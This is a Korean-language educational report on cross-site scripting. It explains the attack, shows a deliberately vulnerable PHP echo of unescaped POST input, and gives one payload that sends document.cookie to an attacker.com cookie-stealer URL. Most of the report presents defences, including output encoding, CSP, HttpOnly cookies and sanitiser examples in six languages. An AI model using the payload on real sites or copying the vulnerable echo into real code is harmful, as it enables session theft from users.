# XSS (Cross-Site Scripting) 분석 보고서

## 1. XSS 란?

**신뢰된 웹사이트에 악성 스크립트 주입하기**

- **정의:** 공격자가 다른 사용자가 보는 웹페이지에 악의적인 클라이언트 사이드 스크립트(주로 JavaScript)를 삽입하는 공격 기법입니다.
- **원리:** 웹 애플리케이션이 사용자로부터 입력받은 데이터를 검증하거나 이스케이프 처리하지 않고, 그대로 페이지에 표시할 때 발생합니다.
- **영향:**
    - **세션 탈취:** 사용자의 세션 쿠키를 훔쳐 계정을 도용합니다.
    - **개인정보 유출:** 사용자의 개인정보를 공격자의 서버로 전송합니다.
    - **악성 사이트 리디렉션:** 피싱 사이트나 악성코드를 유포하는 사이트로 사용자를 유도합니다.
    - **웹사이트 변조:** 웹페이지의 내용을 임의로 변경하거나 기능을 마비시킵니다.

---

## 2. 취약한 코드 분석 (`xss_test.php`)

**문제의 핵심: 사용자 입력의 무분별한 출력**

```php
// 사용자가 입력한 검색어
$payload = $_POST['payload'];

// 취약한 출력 방식 (시뮬레이션된 코드)
// 만약 애플리케이션이 아래와 같이 코드를 작성했다면 XSS에 취약합니다.
echo "검색 결과: " . $payload;
```

**핵심 문제점:** 사용자가 입력한 모든 데이터는 잠재적으로 악의적일 수 있다는 원칙을 무시하고, 아무런 처리 없이 그대로 HTML 페이지에 출력하는 것이 문제입니다.

---

## 3. 공격 시나리오: 세션 쿠키 탈취

**공격 목표:** 다른 사용자의 세션 쿠키를 훔쳐서 해당 사용자로 위장하기

**공격 페이로드:**
`<script>document.location='http://attacker.com/cookie_stealer.php?c=' + document.cookie</script>`

**공격 과정:**
1.  공격자는 이 스크립트를 게시판의 댓글이나 검색창 등 사용자의 입력이 출력되는 곳에 삽입합니다.
2.  다른 사용자(희생자)가 해당 페이지를 열람하면, 희생자의 브라우저에서 이 스크립트가 실행됩니다.
3.  스크립트는 희생자의 세션 쿠키 정보를 가로채, 공격자의 서버로 전송합니다.
4.  공격자는 탈취한 쿠키를 이용해 희생자의 계정으로 로그인하여 모든 활동을 할 수 있게 됩니다.

---

## 4. 해결책: 출력 인코딩 (Output Encoding)

**가장 확실하고 중요한 방어 방법**

```php
// 사용자가 입력한 검색어
$payload = $_POST['payload'];

// htmlspecialchars() 함수로 안전하게 인코딩
$safe_payload = htmlspecialchars($payload, ENT_QUOTES, 'UTF-8');

// 안전하게 인코딩된 데이터를 출력
echo "검색 결과: " . $safe_payload;
```

**작동 원리:**
`htmlspecialchars()` 함수는 스크립트 실행에 필요한 특수 문자들을 HTML 엔티티로 변환합니다.
-   `<` → `&lt;`
-   `>` → `&gt;`
-   `"` → `&quot;`

브라우저는 이 변환된 문자들을 태그가 아닌 일반 텍스트로 인식하여, 스크립트가 실행되지 않고 그대로 화면에 표시됩니다.

---

## 5. XSS 방어 전략

1.  **출력 인코딩 (필수):** 사용자의 입력값을 출력할 때는 반드시 컨텍스트(HTML, JavaScript, CSS 등)에 맞는 인코딩을 적용합니다.
2.  **콘텐츠 보안 정책 (CSP):** 브라우저에 신뢰할 수 있는 스크립트 소스를 명시하여, 허용되지 않은 스크립트의 실행을 차단합니다.
3.  **입력값 검증:** 사용자의 입력은 항상 서버 측에서 예상된 형식, 길이, 문자셋인지 검증합니다. (화이트리스트 방식 권장)
4.  **HttpOnly 쿠키 속성 사용:** JavaScript가 쿠키에 접근할 수 없도록 설정하여, 쿠키 탈취 공격의 피해를 최소화합니다.
5.  **최신 프레임워크 사용:** React, Vue, Angular 등 최신 웹 프레임워크는 대부분 기본적으로 XSS 방어 기능을 내장하고 있습니다.

---

## 6. 다양한 언어별 XSS 방어 방법

### JavaScript/Node.js
```javascript
// DOMPurify 라이브러리 사용
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(dirty);

// 템플릿 엔진에서 자동 이스케이핑 (Handlebars)
const template = Handlebars.compile('<div>{{name}}</div>');
const result = template({ name: userInput }); // 자동으로 이스케이프됨

// React에서 안전한 렌더링
function MyComponent({ userContent }) {
    return <div>{userContent}</div>; // 기본적으로 이스케이프됨
    // 위험: dangerouslySetInnerHTML 사용 금지
}

// Express.js에서 XSS 방어
const xss = require('xss');
app.use((req, res, next) => {
    req.body = xss(req.body);
    next();
});
```

### Python/Django/Flask
```python
# Django에서 자동 이스케이핑
# 템플릿에서 {{ user_input }}는 자동으로 이스케이프됨

# Flask에서 수동 이스케이핑
from markupsafe import escape
@app.route('/user/<username>')
def show_user_profile(username):
    return f'User: {escape(username)}'

# Python에서 HTML 이스케이핑
import html
safe_content = html.escape(user_input)

# bleach 라이브러리 사용
import bleach
clean = bleach.clean(user_input, tags=['b', 'i'], strip=True)
```

### Java/Spring
```java
// Spring에서 OWASP Java HTML Sanitizer 사용
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

PolicyFactory policy = Sanitizers.FORMATTING.and(Sanitizers.LINKS);
String safeHTML = policy.sanitize(untrustedHTML);

// JSP에서 JSTL 사용
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
<c:out value="${fn:escapeXml(userInput)}" />

// Spring Security에서 헤더 설정
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentTypeOptions(ContentTypeOptionsConfig.withDefaults())
            .and().headers(headers2 -> headers2
                .addHeaderWriter(new XFrameOptionsHeaderWriter(XFrameOptionsMode.DENY))
            )
        );
        return http.build();
    }
}
```

### C#/.NET
```csharp
// ASP.NET에서 자동 인코딩
@Model.UserInput  // Razor에서 자동으로 HTML 인코딩

// 수동 인코딩
using System.Web;
string safeOutput = HttpUtility.HtmlEncode(userInput);

// AntiXSS 라이브러리 사용
using Microsoft.Security.Application;
string sanitized = Sanitizer.GetSafeHtmlFragment(userInput);

// Content Security Policy 헤더 설정
public void Configure(IApplicationBuilder app)
{
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("Content-Security-Policy", 
            "default-src 'self'; script-src 'self'");
        await next();
    });
}
```

### Go
```go
// html/template 패키지 사용 (자동 이스케이핑)
import "html/template"
tmpl := template.Must(template.New("example").Parse("<div>{{.}}</div>"))
tmpl.Execute(w, userInput) // 자동으로 이스케이프됨

// 수동 HTML 이스케이핑
import "html"
safeOutput := html.EscapeString(userInput)

// bluemonday 라이브러리 사용
import "github.com/microcosm-cc/bluemonday"
p := bluemonday.UGCPolicy()
safeHTML := p.Sanitize(userInput)
```

### Ruby/Rails
```ruby
# Rails에서 자동 이스케이핑
<%= user_input %>  # ERB에서 자동으로 HTML 이스케이프

# 수동 이스케이핑
require 'cgi'
safe_output = CGI.escapeHTML(user_input)

# Sanitize gem 사용
require 'sanitize'
clean_html = Sanitize.fragment(user_input, Sanitize::Config::RELAXED)

# Content Security Policy 설정
class ApplicationController < ActionController::Base
  before_action :set_csp_header
  
  private
  def set_csp_header
    response.headers['Content-Security-Policy'] = "default-src 'self'"
  end
end
```
